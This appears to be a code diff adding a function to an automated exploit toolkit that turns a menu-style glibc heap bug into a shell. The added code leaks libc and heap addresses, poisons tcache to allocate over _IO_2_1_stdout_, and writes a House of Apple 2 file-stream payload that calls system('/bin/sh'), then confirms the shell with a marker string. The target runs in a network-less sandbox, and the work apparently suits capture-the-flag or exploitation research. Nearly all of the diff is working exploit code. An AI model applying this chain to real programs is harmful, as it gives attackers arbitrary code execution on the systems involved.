@@ -585,3 +585,108 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
             best = {**cls, "trigger": trig, "dump": dump[:400]}
             break
     return best
+
+
+# --- automated glibc-heap -> shell: tcache poison _IO_2_1_stdout_ + House of Apple 2 (gap #4) ----
+def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
+                      poison_size=0x300, guard_size=0x430, marker=b"LYKOS-HEAP-9931",
+                      timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
+    """Drive a menu-style glibc-heap target to a shell, fully automatically, via tcache poisoning +
+    House of Apple 2. Composes the pieces lykos already has (menu model, safe-linking, FSOP):
+
+      1. libc leak  -- free a large chunk (skips tcache -> unsorted bin, its fd points into libc);
+         view it; `base = leaked - unsorted_off` (main_arena+0x60 for the target's glibc).
+      2. heap leak  -- free a tcache chunk and view its fd == chunk>>12 (safe-linking key; the low
+         bits are not needed, mangle only XORs the page).
+      3. poison     -- with two freed tcache chunks, edit the head's fd to mangle(chunk, stdout);
+         two allocations then hand back a chunk AT `_IO_2_1_stdout_`.
+      4. FSOP       -- write build_house_of_apple2 into that chunk, then `exit_seq` flushes the
+         corrupted stdout -> system("/bin/sh").
+
+    The four ops are supplied as callables that render the target's own menu input:
+    `add(idx,size,data)->bytes`, `free(idx)->bytes`, `view(idx)->bytes`, `edit(idx,data)->bytes`;
+    `exit_seq` triggers a flush. Confirmed by a spawned shell echoing `marker`. Returns
+    {ok, libc_base, heap_page, ...}."""
+    import struct as _struct
+
+    from . import heap as _heap
+    from . import rop
+    T = _heap.house_of_apple2_targets(libc_data)
+    if not T:
+        return {"ok": False, "reason": "libc lacks _IO_2_1_stdout_/_IO_wfile_jumps/system"}
+    exedir = str(Path(exe).resolve().parent)
+    preexec = sandbox._rlimits(mem_mb, int(timeout) + 4, set_as=True)
+    cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
+        [str(exe)] + [str(a) for a in base_argv]
+    try:
+        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                             preexec_fn=preexec)
+    except Exception as e:                               # noqa: BLE001
+        return {"ok": False, "reason": f"spawn failed: {e!r}"}
+
+    def _op(seq, read_secs=0.35):
+        try:
+            p.stdin.write(seq)
+            p.stdin.flush()
+        except (BrokenPipeError, OSError):
+            return b""
+        return _read_until(p, time.time() + read_secs, quiet=0.2)
+
+    def _ptr(out):
+        return _struct.unpack("<Q", out[:8].ljust(8, b"\x00")[:8])[0] if out else 0
+    try:
+        _read_until(p, time.time() + 0.5)
+        # 1) libc leak via the unsorted bin
+        _op(add(0, guard_size, b"A"))
+        _op(add(1, guard_size, b"B"))               # guard: stops back-consolidation with the top
+        _op(free(0))
+        libc_leak = _ptr(_op(view(0), 0.5))
+        base = rop.resolve_libc_base(libc_leak, unsorted_off)
+        if not base:
+            return {"ok": False, "reason": f"libc leak failed (got {hex(libc_leak)})"}
+        stdout_addr = base + T["stdout"]
+        # 2) heap leak via a freed tcache chunk's safe-linked fd
+        _op(add(2, poison_size, b"C"))
+        _op(add(3, poison_size, b"D"))
+        _op(free(2))
+        heap_page = _ptr(_op(view(2), 0.5))          # == chunk2 >> 12
+        if not heap_page:
+            return {"ok": False, "reason": "heap leak failed"}
+        _op(add(2, poison_size, b"C"))               # take chunk2 back; tcache empty for this size
+        # 3) poison: free two, mangle the head's fd to _IO_2_1_stdout_
+        _op(free(3))
+        _op(free(2))
+        _op(edit(2, _struct.pack("<Q", heap_page ^ stdout_addr) + b"\x00" * 8))
+        _op(add(4, poison_size, b"E"))               # returns chunk2
+        # 4) the next allocation lands on _IO_2_1_stdout_; write the House of Apple 2 FILE there
+        blob = _heap.build_house_of_apple2(stdout_addr, wfile_jumps=base + T["wfile_jumps"],
+                                           system=base + T["system"])
+        _op(add(5, poison_size, blob[:poison_size]))
+        # trigger the flush -> FSOP -> shell, then confirm
+        try:
+            p.stdin.write(exit_seq)
+            p.stdin.flush()
+            time.sleep(0.3)
+            p.stdin.write(b"echo " + marker + b"\n")
+            p.stdin.flush()
+        except (BrokenPipeError, OSError):
+            return {"ok": False, "reason": "crashed before the shell", "libc_base": base}
+        out = _read_until(p, time.time() + timeout, quiet=1.5)
+        if marker in out:
+            return {"ok": True, "libc_base": base, "heap_page": heap_page,
+                    "stdout": stdout_addr, "output": out[:400].decode("latin-1", "ignore")}
+        return {"ok": False, "reason": "no shell confirmed", "libc_base": base,
+                "output": out[:200].decode("latin-1", "ignore")}
+    finally:
+        for s in (p.stdin, p.stdout):
+            try:
+                if s is not None:
+                    s.close()
+            except Exception:                           # noqa: BLE001
+                pass
+        _kill(p)
+        try:
+            p.wait(timeout=2)
+        except Exception:                               # noqa: BLE001
+            pass
